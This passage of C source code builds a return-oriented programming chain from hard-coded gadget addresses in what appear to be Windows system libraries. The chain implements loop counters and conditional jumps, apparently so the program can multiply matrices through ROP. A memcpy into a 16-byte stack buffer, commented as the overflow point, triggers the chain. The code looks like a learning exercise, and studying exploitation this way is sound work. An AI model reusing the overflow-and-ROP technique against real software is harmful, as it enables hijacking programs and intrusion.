	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// j = j - 1
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB0\x41\x40\x00"								// 0x004041B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xC5\x93\x91\x7C"								// 0x7C9193C5 - dec eax; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xB0\x41\x40\x00"								// 0x004041B0 - &j
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							// Conditional
							// if(j>=0) jump; else continue;
							//	if(j<0) set CF by performing j+80000000
							//			Load [j] into eax 
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xB0\x41\x40\x00"								// 0x004041B0 - &j
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x95\x52\x91\x7C"								// 0x7C915295 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;				-- if(n<0) eax=0; else if(n>=0) eax=1;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=2;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=4;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=8;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Random extra ret to put a breakpoint at in a debugger
							"\x14\x14\x93\x7C"								// 0x7C931414 - ret;
							//	if(n<0) esp=esp;	else if(n>=0) esp = esp+8;
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// Go to different parts of the code depending on outcome of conditional
							//	if(n<0) continue...
							"\xF2\x11\x90\x7C"								// 0x7C9011F2 - ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							//	else if(n>=0) jump...
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\xB8\x73\x12\x00"								// 0x001273B8 - &ifTrue
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

							// i = i - 1
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xC5\x93\x91\x7C"								// 0x7C9193C5 - dec eax; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler

							// Conditional
							// if(i>=0) jump; else continue;
							//	if(i<0) set CF by performing i+80000000
							//			Load [i] into eax 
							"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
							"\xAC\x41\x40\x00"								// 0x004041AC - &i
							"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							//			Load 80000000 into esi
							"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
							"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
							"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;
							"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
							"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
							"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler (4)
							"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
							"\x95\x52\x91\x7C"								// 0x7C915295 - neg eax; pop ebp; ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x19\x2A\x90\x7C"								// 0x7C902A19 - inc eax; ret;				-- if(n<0) eax=0; else if(n>=0) eax=1;
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=2;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=4;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=0;	else if(n>=0) eax=8;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
							"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							"\x00\x00\x00\x00"								// 0x00000000 - imm filler
							// Random extra ret to put a breakpoint at in a debugger
							"\x14\x14\x93\x7C"								// 0x7C931414 - ret;
							//	if(n<0) esp=esp;	else if(n>=0) esp = esp+8;
							"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
							// Go to different parts of the code depending on outcome of conditional
							//	if(n<0) continue...
							"\xF2\x11\x90\x7C"								// 0x7C9011F2 - ret 8;
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
							//	else if(n>=0) jump...
							"\xAB\x9B\x92\x7C"								// 0x7C929BAB - pop esp; ret;
							"\x48\x73\x12\x00"								// 0x00127348 - &ifTrue
							"\x31\x12\x90\x7C"								// 0x7C901231 - ret;

	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
							// Print answer
							"\x40\x10\x40\x00"								// 0x00401040 - &printAnswer	
							;
	char buf[16];
	//printf("Address of newerStack[0] = %p\n", &newerStack[0]);
	//printf("Length of newerStack     = %d\n", sizeof(newerStack) / sizeof(newerStack[0]));
	memcpy(buf, newBuff, sizeof(newBuff)-1);		// Where the buffer overflow occurs
	return;
}

int main(int argc, char* argv[]) {
	char extraSpace[32768];
	int i;
	
	for(i = 0; i < VARS_SIZE; i++) vars[i] = 0;
	vars[100] = atoi(argv[1]);
	for(i = 0; i < vars[100]*vars[100]; i++) vars[200 + i] = atoi(argv[2 + i]);							// for i less than size of matrix, populate m1
	for(i = 0; i < vars[100]*vars[100]; i++) vars[300 + i] = atoi(argv[2 + vars[100]*vars[100] + i]);	// for i less than size of matrix, populate m2

	//printAddresses();							// Makes debugging easier
	exploit();
	return 0;
}
